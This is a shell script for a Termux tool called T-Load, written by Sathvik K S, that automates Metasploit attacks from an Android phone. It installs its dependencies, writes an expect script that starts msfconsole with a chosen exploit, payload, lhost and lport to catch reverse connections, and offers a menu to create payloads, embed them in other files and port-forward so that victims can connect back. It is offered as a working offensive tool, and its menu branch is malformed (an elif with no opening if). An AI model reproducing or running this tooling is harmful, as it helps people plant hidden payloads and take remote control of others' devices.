trap '' INT TSTP
source $HOME/T-Load/host
source $HOME/T-Load/.clr
dir="$HOME/T-Load"
mdir="$HOME/.msf_default"
cd $dir
### Auto Setup
clear
if [ ! -d "$mdir" ]; then
mkdir $mdir
fi
chmod +x *
chmod +x .*
chmod 600 key
chmod +x pfs
chmod 600 pfskey
OS=$(./.setupcheck openssh)
SP=$(./.setupcheck sshpass)
CU=$(./.setupcheck curl)
RS=$(./.setupcheck rsync)
EX=$(./.setupcheck expect)
if [ "$OS" == "0" ] || [ "$SP" == "0" ] || [ "$CU" == "0" ] || [ "$RS" == "0" ] || [ "$EX" == "0" ]; then
clear
echo -e "$bgy $bl Welcome to T-Load. This must be your first use or the required files must have been deleted. So please wait untill all the required files have been setup.$rt"
sleep 8
#Setup
pkg install openssh -y
pkg install sshpass -y
pkg install curl -y
pkg install rsync -y
apt-get install expect -y
[[ -s $HOME/.msf_default/msfload ]]
msfl=$(echo $?)
mkdir $HOME/.msf_default
if [ $msfl = "1" ]
then
echo '#!/data/data/com.termux/files/usr/bin/expect -f
source /data/data/com.termux/files/home/.msf_default/port
source /data/data/com.termux/files/home/.msf_default/host
source /data/data/com.termux/files/home/.msf_default/exploit
source /data/data/com.termux/files/home/.msf_default/payload
spawn msfconsole
expect "msf > "
send "use $exploit \r"
expect "msf exploit(handler) > "
send "set payload $payload \r"
expect "msf exploit(handler) > "
send "set lhost $lhostused \r"
expect "msf exploit(handler) > "
send " set lport $lportused \r"
expect "msf exploit(handler) > "
send "exploit \r"
interact' >> $HOME/.msf_default/msfload
fi
cd $HOME/T-Load
chmod +x $HOME/.msf_default/msfload
chmod +x embed
chmod +x pfs
chmod +x updates
chmod 600 key
chmod 600 pfskey
chmod +x redownload
touch $HOME/.msf_default/pay
touch $HOME/.msf_default/port
touch $HOME/.msf_default/port
touch $HOME/.msf_default/host
touch $HOME/.msf_default/payload
touch $HOME/.msf_default/exploit
ln -s $HOME/T-Load/tload /data/data/com.termux/files/usr/bin/tload
chmod +x /data/data/com.termux/files/usr/bin/tload
#End Setup
fi
no=$(ls $HOME/.msf_default | wc -l)
if [ ! -d $HOME/.msf_default ] || [ "$no" != "7" ];
then
clear
chmod +x *
chmod +x .*
chmod 600 key
chmod +x pfs
chmod 600 pfskey
OS=$(./.setupcheck openssh)
SP=$(./.setupcheck sshpass)
CU=$(./.setupcheck curl)
RS=$(./.setupcheck rsync)
EX=$(./.setupcheck expect)
if [ "$OS" == "0" ] || [ "$SP" == "0" ] || [ "$CU" == "0" ] || [ "$RS" == "0" ] || [ "$EX" == "0" ]; then
clear
echo -e "$bgy $bl Welcome to T-Load. This must be your first use or the required files must have been deleted. So please wait untill all the required files have been setup.$rt"
sleep 8
#Setup
pkg install openssh -y
pkg install sshpass -y
pkg install curl -y
pkg install rsync -y
apt-get install expect -y
[[ -s $HOME/.msf_default/msfload ]]
msfl=$(echo $?)
mkdir $HOME/.msf_default
if [ $msfl = "1" ]
then
echo '#!/data/data/com.termux/files/usr/bin/expect -f
source /data/data/com.termux/files/home/.msf_default/port
source /data/data/com.termux/files/home/.msf_default/host
source /data/data/com.termux/files/home/.msf_default/exploit
source /data/data/com.termux/files/home/.msf_default/payload
spawn msfconsole
expect "msf > "
send "use $exploit \r"
expect "msf exploit(handler) > "
send "set payload $payload \r"
expect "msf exploit(handler) > "
send "set lhost $lhostused \r"
expect "msf exploit(handler) > "
send " set lport $lportused \r"
expect "msf exploit(handler) > "
send "exploit \r"
interact' >> $HOME/.msf_default/msfload
fi
cd $HOME/T-Load
chmod +x $HOME/.msf_default/msfload
chmod +x embed
chmod +x pfs
chmod +x updates
chmod 600 key
chmod 600 pfskey
chmod +x redownload
touch $HOME/.msf_default/pay
touch $HOME/.msf_default/port
touch $HOME/.msf_default/port
touch $HOME/.msf_default/host
touch $HOME/.msf_default/payload
touch $HOME/.msf_default/exploit
ln -s $HOME/T-Load/tload /data/data/com.termux/files/usr/bin/tload
chmod +x /data/data/com.termux/files/usr/bin/tload
#End Setup
fi
fi
## End Auto Setup
#### UPdater
clear
touch updat
rm updat*
git checkout origin/master *
cd $HOME/T-Load
echo -e "$rd $bwt Searching for updates. Please wait :)$rt"
touch $HOME/.msf_default/updates
rm $HOME/.msf_default/updates
git fetch --dry-run 2>&1 > /dev/null| tee $HOME/.msf_default/updates
up=$HOME/.msf_default/updates
if grep -q origin/master "$up"; then
clear
echo -e "$bl $bwt Updates are found. Now updating$rt"
sleep 1
update=$(git fetch --all
git reset --hard origin/master
git pull)
clear
chmod +x *
chmod +x .*
chmod 600 key
echo -e "$bwt $rd Update done. $bl Restarting$rt"
sleep 2
reload=$(readlink -f "$0")
exec "$reload"
else
chmod +x *
chmod +x .*
chmod 600 key
chmod 600 key
echo -e "$rd $bwt No updates $rt"
sleep 2
fi
########Updater end
cd $HOME/T-Load
#
#
## Begin T-Load
clear
if [ "${1}" = "embed" ]
then 
./embed
fi
echo -e "$rd $bcn----------------------------------$rt"
echo -e "$rd $bd $ul $bgy     Version = 8.0 $rt "
echo -e "$rd $bcn----------------------------------$rt"
echo -e "$bl $bgy     SCRIPT BY SATHVIK K S        $rt "
echo -e "$rd $bcn----------------------------------$rt"
echo -e "$bwt $bk Select option $rt $rd"
echo "1. Create Payload"
echo "2. Embed Payload"
echo "3. Set default commands for msfconsole"
echo "4. Launch msfconsole with default values"
echo "5. Port Forward "
echo "6. Redownload"
echo "7. Exit"
echo -e "$rt $bbl"
read -p ">|" o 
echo -e "$rt"

##################
# Create Payload
#################
elif [ $o = "1" ]
then
./createpayload

##########
# Embed
##########
elif [ $o = "2" ]
then
./embed

#################################
# Set Default msfconsole values
################################
elif [ $o = "3" ]
then
echo "Type the set of commands and then press "ctrl + x" followed by "y" and then click "Enter" to save the file"
nano $HOME/.msf_default/msfd
echo "Value stored"
sleep 2
tload

#########################################
# Launch msfconsole with default values
#########################################
elif [ $o = "4" ]
then
msfconsole -r $HOME/.msf_default/msfd

################
# Port Forward
################
elif [ $o = "5" ]
then
if [[ ! -e $HOME/.msf_default/psf ]]; then
    touch $HOME/.msf_default/psf
fi
./pfs

###############
# Redownload
###############
elif [ $o = "6" ]
then
./redownload

#########
# Exit
#########
elif [ $o = "7" ]
then
clear
exit

#######
# End 
#######
else
echo "Wrong choice. Please try again"
sleep 3
tload
fi
# End T-Load
